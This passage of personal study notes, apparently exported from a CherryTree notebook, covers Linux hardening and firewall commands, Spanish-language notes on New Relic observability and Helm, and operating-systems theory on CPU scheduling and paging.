   → with ACL add + at the end of permission
   → to get permissions in file: getfacl {path to file}

Securiting Linux System
- MOTD
   → message of day
   → information about the system os just message from the sysadmin
   → used to alert users that activity is monitored
   → file: /etc/motd
- customize message of day
   → is the first message when users connect
   → create file in /etc/profile.d/motd.sh
   → add commands in motd.sh
   → modify /etc/ssh/ssh_config in PrintMotd Yes to no
   → restart ssh services
- remove un necesary or orphan packages
   → the first rule is: install only necesary
   → pay attention to the add-on packages
   → get a list of all packages: rqm --qa
   → apt list --installed
   → rpm --e package name to remove
   → apt-get remove package name
   → yum utils to check orhphaned packges
   → rpm -qa | grep yum-utils to check if is installed
   → package-cleanup --leaves, show all orphan packages
   → apt-get autoremove
- kernel an system up to date
   → register to OS provider
   → stay connected with the technical news feeds and os community
   → run package management software
   → yum update or upgrade
   → apt-get update
   → two types of upgrades
      ⇒ major version = 5, 6, 7
      ⇒ minor version = 7.3 to 7.4
      ⇒ mayor version not yum command
      ⇒ minor version = yum update
- Stop and disable unwanted services
   → </rich_text>
        <rich_text weight="heavy">netstat -l</rich_text>
        <rich_text> to check what services is running
   → </rich_text>
        <rich_text weight="heavy">netstat -tulpn</rich_text>
        <rich_text> to more especifig
   → </rich_text>
        <rich_text weight="heavy">systemctl</rich_text>
        <rich_text>
   → </rich_text>
        <rich_text weight="heavy">chkconfig --list</rich_text>
        <rich_text>, older versions of centos
   → </rich_text>
        <rich_text weight="heavy">service --status-all | grep running</rich_text>
        <rich_text> (centros or ubuntu) this is deprecated
   → </rich_text>
        <rich_text weight="heavy">ps -ef</rich_text>
        <rich_text>, to show all processes
   → disabled /etc/pam.d for programas that is not used
- Separate disk partition
   → the best partition is:
      ⇒ /
      ⇒ /boot
      ⇒ /usr
      ⇒ /home
      ⇒ /tmp
      ⇒ /var
      ⇒ /opt
   → keep data safer froom malware attacks
   → this is easy extends with LVM
   → multiple filesystem for each partition
- disable alt + ctrl + del
   → command to check the status: systemctl status ctrl-alt-del.target
   → ddisabled systemctl disable ctrl-alt-del.target, systemctl mask ctrl-alt-del.target
- running one service per system
   → use one service by service, is used to protect the server
- disable usb stick detection
   → create file /etc/modprobe.d/no-usn
   → add: install usb-storage /bin/true
- lockdown cronjobs
   → used to schedule command at specific time
   → used to create backups, monitoring disk space, deleting files, system mantain and others
   → files
      ⇒ /etc/cron.allow, allow users to use crons
      ⇒ /etc/cron.deny, to lock users using crons

- change ssh port
   → used port 22
   → listing of ports: /etc/services
   → rdp = 3389
   → /etc/ssh/sshd_config
   → change Port 22 = Port 1110
- SELinux
   → security enhanced linux
   → linux security kernel provides a mechanism for supporting access control security polies
   → this is provided by NSA and the SELinux community
   → enforcing = enable, by default
   → Permissive = enable, diabled logs the activity
   → Disable = Disabled, not activiy logs
   → sestatus or getenforce - check status
   → setenforce = 0 permissive/Disable, setenforce = 1 Enable
   → config: /etx/selinux/config
   → two concepts"
      ⇒ labeling
      ⇒ type enforcing
   → ls -lZ {file} to chec the label of a directory
   → booleans
      ⇒ getsebool -a or semange boolean -l, list all booleans
      ⇒ to enable or turn on: setsebool -P {boolean_name} on
      ⇒ check error message related: journalctl
      ⇒ chcon -t {label} {FILENAME}, semanage -t {label} {FILENAME}, to change type of label
- system backup
   → backuping the OS
   → is used in case of hardware, os apps failure
   → 5 types
      ⇒ physical system (entire image using acronis, veeam)
      ⇒ virtual system (snapshots)
      ⇒ application backup, third party apps backup
      ⇒ database backup
      ⇒ filesystem backup (tar, gzip dirs)
      ⇒ disk backup or disk clonning (dd)

Linux System Network
- firewall
   → spread of fire
   → chekc if packages information is tested againts the firewall rules
   → firewall is a watchman, bouncer or a shield
   → exists two types
      ⇒ software, run on operating system
      ⇒ hardware, a dedicated appliance with firewall software
- there are 2 tools
   → iptables, for older linux versions
   → firewalld, , for new version
- iptables -L, to check iptables rules
- iptables -F, to flush iptables
- exists in iptables:
   → tables, is something that allows you to process packets in specific ways, are 4 types: gilter, mangle, nat and raw
   → chains: are attached to tables, these chains allos you yo inspect traffic at variuos points, exists 3
      ⇒ Input, incomming trafic
      ⇒ forward, going to router, form one device to another
      ⇒ ouput, outgoing traffic
   → target, decides the fate of a package, such allowing or rejecting:
      ⇒ ACCEPT
      ⇒ REJECT
      ⇒ DROP, drop connection wihtout message of reject
   → the format is: target, protocol, options, source, destination
- iptables -A INPUT -s {ip} -j DROP, drop all trafic coming a specific IP
- iptables -A INPUT -s {ip}/{mask} -j DROP, drop all trafic for a range of IP
- iptables -L --line-num, list all rules by lines
- iptables -D INPUT 1, delete a specific rule by line
- iptables -F, flush entire table
- iptables -A INPUT -p {protocol} -j REJECT, reject specific protocol
- iptables -A INPUT -p {protocol} -j DROP, drop connection
- iptables -A INPUT -p {protocol} --dport {port} -j DROP, to block specific port
- iptables -A INPUT -i {interface} -s {ip} -j DROP, block a network interface
- to block some specific domain
   → get ip address: host -t a {host}
   → and block by ip
- iptables-save, save all changes in /etc/sysconfig/iptables
- iptables-restore {path to file} to get saved conf
- by default is logged in /var/log/messages
- DROP is over ACCEPT
- FirewallD
   → is similar to iptables, firewall-cmd
   → few a pre-defined services rules, to easy admin
   → exists
      ⇒ tables
      ⇒ chains
      ⇒ rules
      ⇒ targets
   → is not recommend run both
   → firewall-cmd --list-all to check all rules
   → firewall-cmd --get-services, services is aware of
   → firewall-cmd reload, reload configuration added
   → exist multiple zones: firewall-cmd --get-zones, this is used to defined rules
   → firewall-cmd --get-active-zones, to check active rule
   → firewall-cmd --zone={zone} --list-all, to get rules for zone
   → ALL SERVICES ARE DEFINED IN /usr/lib/firewalld/services/allservices.xml
   → add service: firewall-cmd --add-service={service}, exist --permanet, for add or remove
   → firewall-cmd --remove-service={service}, to remove service
   → firewal-cmd --reload, is necesary before add or remove
   → firewall-cmd --add-port={port}/{protocol}, to add port
   → firewall-cmd --remove-port={port}/{protocol}, to remove port
   → </rich_text>
        <rich_text weight="heavy">firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.0.25" reject'</rich_text>
        <rich_text>, to reject incoming traffic
   →  </rich_text>
        <rich_text weight="heavy">firewall-cmd --{add|remove}-icmp-block-inversion</rich_text>
        <rich_text>, block and unblock ICMP traffic, ping traffic
   → to block website:
      ⇒ get ip address: host -t a {host}
      ⇒ firewall-cmd --direct --add-rule ipv4 filter OUTPUT 0 -d {ip} -j DROP
- firewall GUI
   → managing firewall using gui
- encrypt trafic
   → hide the content of message or data
   → ssh vs telnet
   → sftp vs ftp
   → scp vs cp
   → https vs http
   → mount remote server file system with sshfs and fuse tool
- telnet does not encrytp data
   → systemctl status telnet.socket
   → service xinetd start (older version)
   → chkconfig telnet off (older version)
- turn off IPV6
   → ifconfig | grep inet6, to check if is enabled
   → in /etc/default/grub add: GRUB_CMD_LINUX="ipv6.disable=1 ..."
   → update grub conf, grub2-mkconfig -o /boot/grub2/grub.cfg
   → and reboot

Securing environment around linux
- hardware/network firewall
   → same like linux networking
   → in hardwqare is posible decide which traffic should and not reach server
- NAT
   → network address translation
   → method to remapping one IP address space into another
   → add another layer of security, with destination hidden
   → prevent the depletion of IPV4 address
   → provides increased flexibility when connecting to the public internet
   → allows use of own private IPv4 addressing
- VPN tunnel
   → virtual private network, encrypt connection by hidding location
- app and database encryption
- types of security threats
   → distributed denial of service (DDoS)
      ⇒ zombie computers
   → hacking 
   → malware
   → pharming
   → phising
   → ransomware
   → spam
   → spoofing
   → spyware
   → trojan horse
   → wifi eaverdropping
   → viruses
   → worms</rich_text>
      </node>
      <node name="platzi" unique_id="143" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1683764972" ts_lastsave="1683765857">
        <rich_text>Habilidades clave
- control de accesos
- monitoreo del sistema
- administracion del sistema
- troubleshooting
- instalacion y mantenimiento de software
- creacion de respaldos
- documentacion

Roles:
- devops engineer, se enfoca en los procesos y metodologias para liberacion en el proceso de software
- SRE, se enfoca en que los sistemas operen de manera correcta
- SOE, se enfoca a que los servidores sean seguros, nivel red y de apps
- Network engineer
- database admin
- Network operatior center engineer, los NOC, dan manteniento
- MLOps engineer
- Cloud engineer

Servidores
- grupo de recursos tecnologicos, que cumplen con uno o varios propositos, se hacen peticiones y devuelve una respuesta</rich_text>
      </node>
    </node>
    <node name="New Relic" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1658543494" ts_lastsave="1672690220">
      <node name="Observabilidad" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1658543502" ts_lastsave="1658873170">
        <rich_text>Introduccion
- como se pueden recolectar datos, trackear apps, visualizar la info y analizarla, para comprender un sistema digital complejo
- hacer que los sistemas sean mas observables
- mejor experiencia de usuario
- no afectacion de la complejidad del desarrollo
- la observabilidad es una habilidad muy necesaria para el ciclo de vida de una app
- las companias de hoy en dia deberian de usar observabilidad para saber el estado de sus apps, sitios web mas robustos, no se es inmune a bug
- desarrollo no a prueba de fallos sino con rapidez para encontrar y arreglar las fallas
- implementacion de observabilidad en un proyecto ya hecho

Como se pasa de paginas web a apps web?
- antes teniamos paginas estaticas
- manejo de cliente-servidor, el flujo simple que se ha usado hasta el momento
- antes teniamos monolitos y se usaba metodologia waterfall
- hoy se tienen mucho deploys y muchos stack tecnologicos
- en velocidad de negocio si no se tienen varios despliegues quiere decir que se esta llendo lento
- se tienen ya varios lenguajes y tecnologias para el desarrollo del negocio, dependiendo del problema se busca la tecnologia que sea util
- desacoplamiento de la complejidad de solo tener un servidor potente, tener varias apps que viven en la nube
- arquitectura de microservicios
- uso y manejo de CI/CD
- cada microservicio debe de usarse para una sola tarea especifica
- todo debe de trabajar de modo orquestada

Contenedores y alojamiento en la nube
- un contenedor es donde se guardan los microservicios
- se tiene todo lo necesario para que se ejcute el codigo
- tener muchos contenedores discretos se conoce como contenerization
- un tiempo atras se guardaban las apps en servidores, que estaban en la misma oficina
- se tienen contenedores que se activan y mueren dependiendo que se requiera, estos viven en la nube
- se vuelve algo complicado monitorear todos los contenedores
- la observabilidad, que esta pasando en la app

Cloud native
- son las app y sistemas que han sido desarrolladas en los tiempos del computo de la nube
- no existe algo como tal que diga que es cloud native
- se repiten algunos elementos que los hacen cloud native

Monitoreo de un sistema
- como saber la salud de los contenedores y K8s
- recolectar datos sobre los sistemas y el rendimiento, monitoreo
- el monitoreo mas comun es el APM, application performance monitoring
- se monitorean puntos de datos, por ejemplo que tanto computo se esta usando, cuanto tiempo de carga se tiene en las paginas
- el monitore se usan estos 4 pasos:
   → plan, se decide que forma de anticipada que debe ser monitoreado
   → intrument, se crean de tal manera que se recolecte la informacion
   → observe, se observan los datos, de lo que se intrumento
   → detect and resolve, cuando el problema se detecta la persona encargada lo dice y se toman acciones
- nucleo
   → nuestro servicio esta en linea y disponible?
   → esta funcionando correctamente?
   → esta funcionando bien?
- Mean time-to-detection (MTTD), este debe de ser el mas bajo, tiempo en que empieza el problema y el equipo lo detecto
- Mean Time-to-resolution (MTTR), tiempo que se tardo uno en resolver el problema que se detecto

Tipos de herramientas y limitaciones del monitoreo
- software as a service
   → se vende en un modelo de suscripcion
   → herramientas para recolectar, almacenar, queries, visualizar, identificar problemas, resolver probelmas
   → son faciles de implementar
   → de acuerdo al negocio
- open source software
   → se especializan en algo especifico
   → se pueden pagar por soporte
- limitaciones:
   → cuando se tienen muchas herramientas que se vuelven un caos, muchisimas herramientas, esto es por que monitorean diferente tipos de targets
   → no conocer donde puede fallar nuestra aplicacion, se decide que se va a monitoreas, hoy son muy complejas las apps

Que es observabilidad
- es la mejora del monitoreo
- dice que tan bien se puede entender el sistema complejo
- instrumentar los sistemas, para datos accionables, te dice por que ocurren los problemas
- es end to end

Pilares de la observabilidad
- Intrumentacion abierta, open instrumentation, los equipos recolectan la telemetria o datos y ponerlos en una locacion central, nos permite medir el rendimiento, se evita tener tantas herramientas para monitorear
- entidades conectadas, connected entities, todos los datos recolectados se conectan de forma organizada, relaciones entre un sistema y sus muchas entidades y relaciones claves del negocio, clarificar que data se tiene y de donde viene, crear significado y contexto, mapea y oraganiza los datos de manera que tengan sentido
- Correlacion y contexto, correlation &amp; context, usar los datos recolectados para tener tablas custom que nos sirve para metricas y objetivos

MELT, mirada de cerca a traces
- 4 tipos de telemetria:
   → M, metrics, usar data de los eventos, sirve para calcular metricas, nos ayudan a hacer preguntas elementares para el negocio, conforme el negocio crece se debe de saber como esta creciendo para saber si vamos por buen camino, sirven cuando se tienen grandes cantidades de datos y sabes que preguntas se requieren
   → E, events, accion distintiva en algun momento del tiempo, generalmente estan en tablas como metadata, se pueden tener n cantidad de tipos de eventos, pocos datos y aun no sabemos que preguntas necesitamos ahcer
   → L, logs, estos van mas granulares, son similares a los eventos, son discretos y especificos de una app, son mas grandes que los eventos y mas especificos, explica cada paso del evento, casi todo en un sistema moderno emite logs, vista detallada
   → T, traces, distributed traces, se llevan a cabo de acuerdo a multiples componentes del sistema, captura la ruta de transaccion que viaja en el sistema distribuido
- si se compara metricas vs eventos, los eventos son irregulares por que no sabemos cuando van a pasar, las metricas sabemos que pueden pasar por x periodo de tiempo, aunque no se tenga en x tiempo se toma por valor 0

Anatomia de una query
- event data types
   → browser
   → APM mobile
   → Synthetics Infraestructure
   → Page view MobileRequest
   → Transaction SystemSample
   → SyntheticCheck
- se ha usado Browser y Page view hasta este momento
- NRQL
   → SELECT function(attribute) FROM EventType (PageView, Transaction, SyntheticCheck, MobileRequest, SystemSample)
   → mas complejo con WHERE {condition} FACET {gruoupby}
   → se puede dar un timeframe
- Query de datos de consulta
   → cuando no se sabe que elementos se deben de consultar
   → dos herramientas
      ⇒ uso de las docs, se puede usar el API de newrelic
      ⇒ data explorer, no se require manualmente construir una query
- Queries avanzadas
   → agregacion de datos, average, max, min,count, uniqueCount
   → intervalos de tiempo
      ⇒ timeseries, ayuda a generar una serie de tiempo, historial respecto al tiempo
      ⇒ since, desde, complementacion de las queries, el tiempo que se requiere
      ⇒ until, se puede tener un periodo unico, desde-hasta
      ⇒ compare with, se toman dos periodos de tiempo y se comparan
   → Multi Facet
      ⇒ agrupacion por varios elementos

Creacion de alertas y buenas practicas
- prevencion de slo dentro del sistema, con alertas proactivas

Synthetics
- para empezar con la observabilidad
- si llega a fallar algo o no se complementa uno de los flujos

Alertas avanzadas
- son un tema muy importanteen observabilidad
- las alertas las administramos con las politicas, es un contenedor para una o mas alertas se compone de dos cosas
   → condiciones, lo que se quiere notificar o sobre que
   → canales de notificacion, por que medio se va a hacer la notificacion
- una politica es una coleccion de algo sobre lo que se quiere ser notificado, se puede notificar por email, slack, webhook, app movil
- preferencias de incidentes: nos determinan que tan seguido un incidente se toma en cuenta en una politica, que tan seguido se es notificado, se configuran en by oplicy
   → si se tienen dos condiciones que no son similares entre ellas, se usa by condition incident, la notificacion se envia si cualquiera de las condiciones se cumple
- by condition and signal, correo por cada violacion que ocurre, es sobrecargada
- se debe ser cuidado de como se configuran las alertas y de como se van a usar

Baseline Thresholds, umbrales de referencia
- statics, barreras o limites estaticas, esta es la mas simple, se usa un numero limite
- dynamics, si la app no es tan simple, se esta esperando que en ciertas horas o dias no se tenga tanta demanda, este se adapta a la realidad del producto, se fija en el historico de las metricas y cuando halla un cambio avisa, aqui no se pone un valor especifico para la condicion
- existen thresholds:
   → criticos, estos se deben resolver de forma inmediata
   → warning, puede dar lugar a una infraccion critica, no critico para el negocio, no es inmediato pero se debe tomar en cuenta

Tipos sinteticos
- proactivo, encuentra problemas antes de que los usuarios los vean
- consistente y predecible, bueno para alertar
- ademas de monitorear esto, las apps tiene usuario reales, estos datos se llaman RUM (Real User Monitoring), se analizan con los sinteticos para tener una mejor forma de asegurar la plataforma
- se juntan datos y se visualizan junsto con los real user, se debn combinar ambas cosas
- tipos
   → pring, checa disponibilidad del sitio web
   → simple browser monitor, monitorea el rendiento de carga de la pagina
   → scripted browser monitor, flujos completos
   → API monitor, asegura que las API clave estan operativas

Rendimiento frontend y core vitals
- el rendimiento en frontend se sigue:
   → availability, es accesible
   → functionality, esta funcionando bien, pueden resolver las tareas criticas
   → performance, esta funcionando lo suficientemente rapido
- core web vitals, es un standard
   → LCP, larguest Contentful Paint
   → FID, First Input Delay
   → CLS, Cumulative Layout Shift, pasa cuando carga una cosa antes de terminar otra accion y se da donde no quiere

Apdex, application performance index
- se mide el rendimiento
- una tabla por defecto se crea
- medicion de sentimientos del usuario
- la medicion es entre 0 y 1, 0 no se tiene usuarios, los usuarios estan frustados con el software
- experiencia de usuario o app como esta funcionando
- apdex = (satisfied request + (Tolerating request / 2)) / Total number of requests</rich_text>
      </node>
    </node>
    <node name="Helm" unique_id="134" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1674670145" ts_lastsave="1675115810">
      <rich_text>helm es un package manager para kubernetes
simplifica la creacion de contenedores en k8s
se podria decir que es como un apt/yum/homebrew
se olvida de la complejidad del cluster, mas para devs
todo se almacena en el paquete de instalacion
permite gestionar versiones
permite hacer rollback de una forma mas rapida

Componentes
- chart, es el paquete de helm, trae toda la info
- repositorio, es donde se guardan los chart
- release, es una ejecucion de un chart

Arquitectura
- por medio de seguridad RBAC se crean los servicios, usando el k8s api

los charts estan empaquetados en .tar.gz
los repos se crean con el archivo index.yaml
de principio no se tiene ningun repo, se deben de instalar: helm repo add stable </rich_text>
      <rich_text link="webs https://charts.helm.sh/stable">https://charts.helm.sh/stable</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">helm repo list</rich_text>
      <rich_text>, muestra todos los repos agregados
</rich_text>
      <rich_text weight="heavy">helm search repo stable</rich_text>
      <rich_text>, mustra todos los charts que se puede usar en el repo
</rich_text>
      <rich_text weight="heavy">helm env</rich_text>
      <rich_text>, muetra las variables que se usaran para el despliegue del cluster
</rich_text>
      <rich_text weight="heavy">helm search hub</rich_text>
      <rich_text>, dentro del repo de la nube
</rich_text>
      <rich_text weight="heavy">helm search repo {repo} -o yaml</rich_text>
      <rich_text>, lo obtiene en formato yaml, json o tabla
</rich_text>
      <rich_text weight="heavy">helm search repo {repo} -l</rich_text>
      <rich_text>, se obtiene un historico del repo
</rich_text>
      <rich_text weight="heavy">helm search repo {repo} --version {version}</rich_text>
      <rich_text>, si se busca un paquete con determinada version
</rich_text>
      <rich_text weight="heavy">helm repo remove {repo}</rich_text>
      <rich_text>, para eliminar los repos
</rich_text>
      <rich_text weight="heavy">helm ls</rich_text>
      <rich_text>, muestra los charts que estan desplegados
</rich_text>
      <rich_text weight="heavy">helm status {nombre}</rich_text>
      <rich_text>, obtiene el status del helm
</rich_text>
      <rich_text weight="heavy">helm get manifest {chart}</rich_text>
      <rich_text>, obtiene el manifest del chart que esta desplegado
</rich_text>
      <rich_text weight="heavy">helm get notes</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">{release}</rich_text>
      <rich_text>, notas del release
</rich_text>
      <rich_text weight="heavy">helm get values {release}</rich_text>
      <rich_text>, obtiene los valores que pone uno mismo
</rich_text>
      <rich_text weight="heavy">helm get all {release}</rich_text>
      <rich_text>, recupera todo
</rich_text>
      <rich_text weight="heavy">helm show all|chart|readme|values {chart}</rich_text>
      <rich_text>, toda la info del charts, el de values muestra lo que se puede usar de valores
</rich_text>
      <rich_text weight="heavy">helm upgrade {release} {chart}</rich_text>
      <rich_text>, para actualizar a la version reciente
</rich_text>
      <rich_text weight="heavy">helm show values {chart}</rich_text>
      <rich_text>, obtiene los valores en formato yaml
</rich_text>
      <rich_text weight="heavy">helm upgrade -f {file} {relase} {chart}</rich_text>
      <rich_text>, para modificar usando el fichero
</rich_text>
      <rich_text weight="heavy">helm history {release}</rich_text>
      <rich_text>, paa ver todos los releases hechos
</rich_text>
      <rich_text weight="heavy">helm rollback {release} {version}</rich_text>
      <rich_text>, crea una nueva version con al anterior
</rich_text>
      <rich_text weight="heavy">helm uninstall {release}</rich_text>
      <rich_text>, para borrar, si se quiere mantener el historial de despliegues: “--kepp-history”


Fichero index.yaml
- contiene, un apiVersion, entries

Trabajando con los charts
- puede ser muy complejo o muy sencillo

PARA REDIS:
helm install redis-test --set persistence.storageClass=nfs-client,redis.replicas.persistence.storageClass=nfs-client bitnami/redis --set volumePermissions.enabled=true


Creacion de charts
- Chart.yaml, contiene toda la informacion del chart
- LICENSE - opcional
- README.md - opciona;
- values.yaml, valores por defecto
- values.schema.json, opcional, esquema json del values
- charts/, directorio de charts dependientes
- templates/, directorio de plantillas que combinado con los valores genera los manifest
- templates/NOTES.txt, opcional ficherso sobre el uso del chart
- existen 2 tipos de charts
- para crear: </rich_text>
      <rich_text weight="heavy">helm create {name}</rich_text>
      <rich_text>
- </rich_text>
      <rich_text weight="heavy">helm install --dry-run</rich_text>
      <rich_text>, sirve para saber que va a hacer helm
- </rich_text>
      <rich_text weight="heavy">helm install --debug  --dry-run</rich_text>
      <rich_text>, nos da mas valores de que se hara
- tiene su </rich_text>
      <rich_text weight="heavy">.helmignore</rich_text>
      <rich_text> que nos ayuda para evitar algunos ficheros dentro del chart
- objetos
   → componentes que se pasan a las plantillas
   → nos ayudan a gestionar la template
   → Release, objeto primario, parte es el name
   → Values, nos ayuda a recuperar los valores del values.yaml
   → Chart, nos trae el chart yaml
   → Files, datos de ficheros adicionales
   → Capabilties, distintas capacidades y fucionalidades de helm
   → Templates, properties de las propias templates
- objeto Release
   → es un objeto built in, se construyo dentro del mismo helm
- se tiene que tener cuidado con las expresiones nulas, ya que estas provocan errores

Values
- la prioridad de carga es:
   → directamente del values.yaml
   → pasar el fichero con -f
   → se puede usar los parametros --set: --set {llave}={valor}

Variables
- sirven identicas a cualquier variable en cualquier otro lenguaje de programacion
- comantarios helm para las plantillas (tipo C), comentarios Yaml para el objeto a trabajar
- estan basadas en lenguaje Golang
- ;los if son muy parecidos a las plantullas de Django
- operadores logicos, son identicos a los de bash
- se puede usar “acceso de tipo objetos” para obtener valores {.Values.favorite.drinks}
- </rich_text>
      <rich_text foreground="#2aa198">el - elimina el espacio en</rich_text>
      <rich_text> los templates
- para usar varias condiciones se debe de usar:
   → `if and (primer validacion) (segunda validacion)...`
- para los bucles se usan slices de YAML, valor de listas con - por cada valor,
- se usa el range en los bucles, dentro de este se puede obtener el indice y el valor, estilo go: $indice,$valor:={lista}
- WITH: establece un ambito dentro de las plantillas, sirve para simplificar, se elige la lista y el valor es pasado como un . (punto)

Funciones:
- se tienen vatias funciones dentro de la pagina
- permite hacer tareas que de otra forma no se podrian hacer
- son funciones predefinidas
- existen pipelines que hacen la funcion identica a las de linux | recogen una salida para transfromarla

Subpantillas (patials)
- sirve para guardar bloques completos para usar en otras plantllas
- seirven para tener ma sordenado el codigo
- pueden ser usados para que no vallan al k8s, se usan para tareas mas livianas
- se crean con define “nombre” y debe terminar en end
- se invocan con {{- template “nombre plantilla” }}
- {{- template “nombre plantilla” . }} se agrega el punto para poder usar los valores a ejecutar, contexto, el unto es un contexto, se pueden poner otros</rich_text>
    </node>
    <node name="os" unique_id="136" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1676838307" ts_lastsave="1699212304">
      <rich_text>Introduction
- combination of hardware, software and data used to solve problems
- level of important
   → CPU
   → Memory
      ⇒ RAM
      ⇒ Harddisk
      ⇒ Cache
      ⇒ Register
- CPU copies data from HDD to RAM for most speed access data
- OS is always present in ram, OS space, other space in for programs (user space)

Concepts
- program vs process
   → cpu checks the program and load in ram
   → the programs contains multiples stages
   → the process is present in ram
   → states
      ⇒ new state
      ⇒ ready state
      ⇒ running state
      ⇒ waiting state / IO state
      ⇒ terminated state
      ⇒ suspend ready state
      ⇒ suspend wait state
- multiprograming
   → maximum number of processes in RAM, assuming RAM in PC
   → size of ram/size of single process
- types of OS
   → cpu efficience = useful of cpu/total time of cpu
   → batch os, execute one process in cpu efficiente and before another
   → multiprogramming, this is only on CPU, for this course
   → multiprocessing, in this exists multiple CPU
- process control block
   → passive entity
   → active entity
   → process is created when program is open
   → this contain
      ⇒ stack, how to execution is processed
      ⇒ heap, where is used the dynamic memory like C using malloc or calloc
      ⇒ datapost. where is saved static variables and global variables
   → attributes
      ⇒ process ID
      ⇒ Program counter, number of intructions of program
      ⇒ Process state
      ⇒ general purpose registers
      ⇒ priority
      ⇒ list of open files
      ⇒ list of open devices
      ⇒ protection
   → cpu scheduling
      ⇒ done by scheduler. which is part of os code
   → preemption
      ⇒ forcefully stopping the execution of process by CPU
   → using properties is like create CPU order execution

CPU scheduling algot
- Types of schedulers
   → The PCB and attributes of a program is called as context
   → long term scheduler, how many process to move to ram
   → short term scheduler, how many process is moved to cpu or wich
   → medium term scheduler, this is swapping from hdd to ram
   → context switching means changing the status of CPU
   → swap in ram and swap on to disk
- times of process
   → arrival time
   → burts time, like execution time
   → completion time
   → turn arounf time
   → waiting time
   → response time
   → i/O time
- types of scheduling algotrithms
   → preemptive, this change between process using priority
   → non preemptive, this complete process
   → this is onlu applied to processes which are in state ready
   → the process I/O will be blockedand so those process will not be consired
- SJF
   → Shortest job first
   → among the arrived processes with the least burst time
   → non-preemptive, also it is a priority based algo
   → find the average TAT, WT, throughtpu and scheduling time
   → TAT = completion time - arrival time
   → if time of execution in lowest to another this is execute first
   → get the avg of execution of process
   → wt = tat - burst time
   → throughput = no. of process / schedule time
- Shortest remaning time fitsrt scheduling algo, SRTF
   → preemptive version of SJF
   → is possible stop some processes if another use minor time of execution
   → reponse time = waiting time for preemption schedulers
   → select the minor times and put the process in execution, depending of time of execution
- FCFS scheduling algo, first come first serve
   → the process which has the least arrrival time will be scheduled first
   → is a nonpreemptive
   → is not a priority based
- FCFS with context switching
   → context switching overhead = 1 time unit
   → in this change between process exists 1 time unit
   → the switching is inefficienty CPU use

Comprations of algos
- starvation
   → if there is a chance for a process in th ready state to wait indefinitely to get the cpu
   → is possible when create multiple process with higher priority and another does not executed
   → is common in SJF algo, in SRFT, no in FCFS
   → any priority based scheduled algorithm
- Convoy effect
   → smaller process, waiting for one big process to get off the cpu
   → FCFS 
- implement
   → SJF and SRTF is very very dificult
   → FCFS, this is easy implement
- Throughput
   → no. of processes executed per unit time

CPU scheduling algos
- LJF, longest job first
   → process with the largest burst time is scheduled first
   → non preemtive
   → priority based algorithm
   → disavantages:
      ⇒ starvation
      ⇒ convoy efect
      ⇒ throughtput is very less
      ⇒ pratical very dificilt to implement
- LRTF, longests remaining time first SA
   → amoung all arrived process, process with the longest burst time will be scheduled first
   → preemtive
   → dis:
      ⇒ startvation
      ⇒ convoy effect
      ⇒ throughtpu is very less
      ⇒ practical is dificult to implment
   → prefer process with longest burst time
   → finally prefer last process id
- Round Robin scheduling
   → time quantum: maximum allowable time a process can run without getting preempted
   → it works on the basics of a paticular time quantum
   → uses queue data strcutures
   → very popular and used in popular os
   → observations:
      ⇒ when time q is minor the queue is biggest when the q time is mayor
   → advantages and limitations
      ⇒ no starvation
      ⇒ no convoy effect
      ⇒ practically implementable
      ⇒ throughput is goob but no as good as SJF or SRTF
      ⇒ response time is good
- priority based scheduling algorithm
   → use priority number to execute
- Highest response ratio next scheduling
   → non preemtive
   → response ratio = (w + b) / b
      ⇒ w = waiting time of process so far
      ⇒ b = burst time
   → favours not only shorter processes but also limits the waiting time of longer processes

Memory Allocation Techniques
- 1 word by registers in CPU, is one instruction and data
- contiguos, 
   → fixed partitioning
   → variable partitioning
- non contiguos
   → address sapce
- logical address space, where is saved the data of process
- physical address space, where is saved the data in the ram
- methods used to loa the process to main memory
   → fixed partiotioning, static
      ⇒ internal fragmentation exists
      ⇒ process size is limited by the size of the longest partition
      ⇒ degre of multiprograming is limited by no. of partitoins
   → varibale partitioning, dynamic
      ⇒ no internal fragmentation problem
      ⇒ degree of multiprograming us not limited
      ⇒ size of process is not limited by size of largest partition, it is limited by the size of ram
   → a partition can hold only one process data, fixed partition
   → a process can be placed in only one partition and it cannot span across 2 or more partitions, fixed partition
- algotiyhms
   → first fit
      ⇒ this accomodate the first process to execute
      ⇒ put process in the holds
      ⇒ when the process is ok send to hdd
   → next fit
      ⇒ is similar to first fit
      ⇒ this check the next hold to save process
      ⇒ use the next before select one with another process
   → best fit, invest
      ⇒ find one hole with the smallest size
   → worst fit, invest
      ⇒ this search the largest hole to execute the process

Paging
- compactation, is when used in dynamic partition is order the memory, this avoid internal fragmentation of static partition
- in random assing of memory
- the logical an physical address can be different
- cpu always work with logical address
- pagesize, size of page in program separations
- framesize, this is the size of every frame
- pagetable is soterd in where is saved page in ram

Multilevel paging
- the normal paging is used the ram in different location, but the page table knows where is saved the program, use index to access the data
- page table is largest of frame
- places in random frame of ram
- used multiple pages
- multiple pages entries in frame
- work like pointers to frames, with multiple levels like tree

Page table entry
- for every page or our process, we mantein a pagetable entry
- so every page table entry will describe its correponding page's property
- contains multiple fiels
   → page frame no, field
   → referece bit, optional
   → modified bit, bialy bit, optional
   → protection bits
   → present/abstent bit, optional
- page replacement, this is for only maintain some process in the ram
   → algos: FIFO, LRU, MRU
   → check whats page is not reference to replace
- present/abstent bit
   → this indicated what process is run in the moment
   → if in 0 the page is not present
   → if 0 this move the process to hdd to ram
- modified bit
   → this is for know if the page entry is modified or not, move from hdd to ram
   → this is used to change the process from ram to hdd
- protection bit
   → this if for read-only, write-only or both
   → is possible indicate 4 options, execute mode
   → needs 2 bits
- dirty bit
   → helps to avoid unnecesaries writes to harddisk 
   → this is for know if process is modified or not

Virtual Memory
- principle of locality
   → says that at anytime a process will require only few pages and these set of pages woll gradually change overtime 
